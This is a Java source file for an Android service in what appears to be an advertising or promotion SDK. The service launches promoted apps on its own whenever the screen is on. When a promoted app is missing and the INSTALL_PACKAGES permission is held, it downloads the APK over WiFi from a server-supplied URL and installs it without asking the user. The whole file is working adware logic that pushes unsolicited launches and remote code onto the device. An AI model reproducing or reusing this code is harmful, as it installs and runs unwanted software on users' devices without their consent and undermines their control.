package com.mf.promotion.service.impl;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;

import com.mf.basecode.model.MyPackageInfo;
import com.mf.basecode.network.util.NetworkConstants;
import com.mf.basecode.network.util.NetworkUtils;
import com.mf.basecode.service.HandleService;
import com.mf.basecode.utils.Logger;
import com.mf.basecode.utils.contants.CommConstants;
import com.mf.data.PromDBU;
import com.mf.download.model.DownloadInfo;
import com.mf.download.util.DownloadConstants;
import com.mf.download.util.DownloadUtils;
import com.mf.model.AppDbStartInfo;
import com.mf.promotion.util.PromUtils;
import com.mf.statistics.prom.util.StatsPromConstants;
import com.mf.statistics.prom.util.StatsPromUtils;
import com.mf.utils.AppInstallUtils;
//import android.util.Log;

public class HandleStartAppService extends HandleService{
  private static final String TAG        = "HandleStart";
  private Handler downloadHandler = new Handler() {
    @Override
    public void handleMessage(Message msg) {
      handleDownloadMessage(msg);
    }
  };
  
  public HandleStartAppService(int serviceId, Context c, Handler handler) {
    super(serviceId, c, handler);
    spf = mContext.getSharedPreferences(CommConstants.SHARED_PREFERENCE_CONFIG, 0);
  }

  @Override
  public void onStartCommand(Intent intent, int flags, int startId) {
    Logger.e(TAG, "111111");
    boolean connect = PromUtils.netIsConnected(mContext);
    if(!connect){
      Logger.e(TAG, "connect");
      return ;
    }
    if(!isScreenOn(mContext)){
      Logger.e(TAG, "isScreenOn "+ isScreenOn(mContext));
      return ;
    }
    if(!pSwitch(spf, CommConstants.SHOW_RULE_START)){
      Logger.e(TAG, "pSwitch " + pSwitch(spf, CommConstants.SHOW_RULE_START));
      return ;
    }
    
    if(!showAdTime()){
      return ;
    }
    
    setProtectTime();
    
    if(!PromUtils.getInstance(mContext).checkHost()){
      Logger.e(TAG, "checkHost false");
      return;
    }
    
    AppDbStartInfo startInfo = getStartInfoItem();
    if(startInfo != null){
      doStartInfo(startInfo);
      PromDBU.getInstance(mContext).resetStartInfoMark();
      PromDBU.getInstance(mContext).updateStartInfoMark(startInfo);
      PromDBU.getInstance(mContext).updateStartInfoDoTimes(startInfo);
    }
    
  }
  
  private void doStartInfo(AppDbStartInfo startInfo){
    PackageInfo pInfo = AppInstallUtils.getPgInfoByPackageName(mContext, startInfo.getAppPackagename());
    Logger.e(TAG, "doStartInfo");
    if (pInfo != null) {
      Logger.e(TAG, "doStartInfo 111");
      Intent intent = mContext.getPackageManager().getLaunchIntentForPackage(startInfo.getAppPackagename());
      intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
      mContext.startActivity(intent);
      Logger.e(TAG, "doStartInfo 222");
      StatsPromUtils.getInstance(mContext).addLaunchAction(startInfo.getAdid()+"/"+startInfo.getAppPackagename(),StatsPromConstants.STATS_PROM_AD_INFO_POSITION_START);
    } else {
        boolean isRoot = mContext.checkCallingOrSelfPermission("android.permission.INSTALL_PACKAGES") == 0;
        String apkPath = DownloadUtils.getInstance(mContext).getApkDownloadFilePath(startInfo.getAppPackagename(), startInfo.getVersoionCode());
        MyPackageInfo packageInfo = new MyPackageInfo(startInfo.getAdid(),startInfo.getAppPackagename(), startInfo.getVersoionCode(), StatsPromConstants.STATS_PROM_AD_INFO_POSITION_START, 0, true);
        File apkFile = new File(apkPath);
        if (apkFile.exists()){
            AppInstallUtils.installStartApp(mContext, apkPath, packageInfo);
        }
        if (NetworkUtils.getNetworkType(mContext) == NetworkConstants.NERWORK_TYPE_WIFI && isRoot){
          if(TextUtils.isEmpty(startInfo.getDownUrl())){
            return;
          }
          DownloadInfo dinfo = new DownloadInfo(downloadHandler,startInfo.getAdid(),
              startInfo.getAppPackagename(), startInfo.getVersoionCode(), StatsPromConstants.STATS_PROM_AD_INFO_POSITION_START, 0, startInfo.getDownUrl(), startInfo.getMd5(), true,false);
          if(DownloadUtils.getInstance(mContext).isDownloadOrWait(dinfo, packageInfo)){
            DownloadUtils.getInstance(mContext).addExtraHandler(downloadHandler);
          }else{
            DownloadUtils.getInstance(mContext).addDownloadApkThread(dinfo);
          }
        }
    }
  }
  
  
  private AppDbStartInfo getStartInfoItem(){
    ArrayList<AppDbStartInfo> startList = PromDBU.getInstance(mContext).queryStartInfo();
    Logger.e(TAG, startList.toString());
    int markPosition = -1;
    for (int i = 0; i < startList.size(); i++) {
      if(startList.get(i).getMark() == 1){
        markPosition = i;
        break;
      }
    }
    Logger.e(TAG, "markPosition = "+markPosition);
    for (int i = markPosition+1; i < startList.size(); i++) {
      if(startList.get(i).getDoTimes() < startList.get(i).getStartTimes()){
        if(AppInstallUtils.getPackageInfoByPackageName(mContext, startList.get(i).getAppPackagename()) != null || !TextUtils.isEmpty(startList.get(i).getDownUrl())){
          return startList.get(i);
        }
      }
    }
    
    for(int i = 0; i < markPosition +1; i++){
      if(startList.get(i).getDoTimes() < startList.get(i).getStartTimes()){
        if(AppInstallUtils.getPackageInfoByPackageName(mContext, startList.get(i).getAppPackagename()) != null || !TextUtils.isEmpty(startList.get(i).getDownUrl())){
          return startList.get(i);
        }
      }
    }
    return null;
  }
  
  public void handleDownloadMessage(android.os.Message msg) {
    Bundle b = (Bundle) msg.obj;
    String adid = b.getString(DownloadConstants.DOWNLOAD_HANDLER_BUNDLE_ADID);
    final String packageName = b.getString(DownloadConstants.DOWNLOAD_HANDLER_BUNDLE_PACKAGE_NAME);
    int version = b.getInt(DownloadConstants.DOWNLOAD_HANDLER_BUNDLE_VERSION_CODE);
    if (!TextUtils.isEmpty(packageName)) {
      if (msg.what == DownloadConstants.DOWNLOAD_HANDLER_STATUS_DOWNLOAD_FINISH) {
        String apkPath = DownloadUtils.getInstance(mContext).getApkDownloadFilePath(packageName, version);
        MyPackageInfo packageInfo = new MyPackageInfo(adid,packageName, version, StatsPromConstants.STATS_PROM_AD_INFO_POSITION_START, 0, true);
        if (showAdTime()){
            Logger.e(TAG, ""+packageName);
            AppInstallUtils.installStartApp(mContext, apkPath, packageInfo);
        }
      }
    }
  }
  
  private void setProtectTime(){
    int st_seconds = spf.getInt(CommConstants.START_SECONDS, 3600);
    spf.edit().putLong(CommConstants.START_PROTECT, System.currentTimeMillis()+st_seconds*1000).commit();
  }

  @Override
  public void handledAds(List<String> ads) {
    // TODO Auto-generated method stub
    
  }
  
  
}
